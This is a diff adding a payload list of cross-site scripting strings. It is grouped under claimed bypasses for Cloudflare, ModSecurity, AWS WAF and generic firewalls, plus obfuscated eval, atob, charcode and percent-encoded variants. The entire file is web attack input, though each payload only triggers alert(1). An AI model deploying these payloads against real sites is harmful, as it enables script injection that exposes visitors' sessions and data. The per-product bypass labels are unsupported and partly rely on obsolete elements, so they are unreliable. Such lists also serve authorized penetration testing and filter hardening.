@@ -1,0 +1,31 @@
+# WAF bypass XSS payloads
+# Cloudflare bypasses
+<svg onload=alert`1`>
+<iframe srcdoc="<svg onload=alert(1)>">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+
+# ModSecurity bypasses
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror=eval(atob("YWxlcnQoMSk="))>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+
+# AWS WAF bypasses
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<isindex action=javascript:alert(1) type=submit>
+
+# Generic WAF bypasses
+<script>alert(/XSS/.source)</script>
+<script>alert(1..toString(36))</script>
+<script>alert(String.fromCharCode(49))</script>
+<script>alert(/1/.source)</script>
+<script>alert(1+"")</script>
+<script>alert(+!+[]+[+!+[]]+"")</script>
+<script>alert((+!+[])+(+!+[]))</script>
+
+# Obfuscated payloads
+<script>eval(unescape("%61%6c%65%72%74%28%31%29"))</script>
+<script>eval(decodeURIComponent("%61%6c%65%72%74%28%31%29"))</script>
+<script>Function("ale"+"rt(1)")()</script>
+<script>setTimeout`alert\x281\x29`</script>
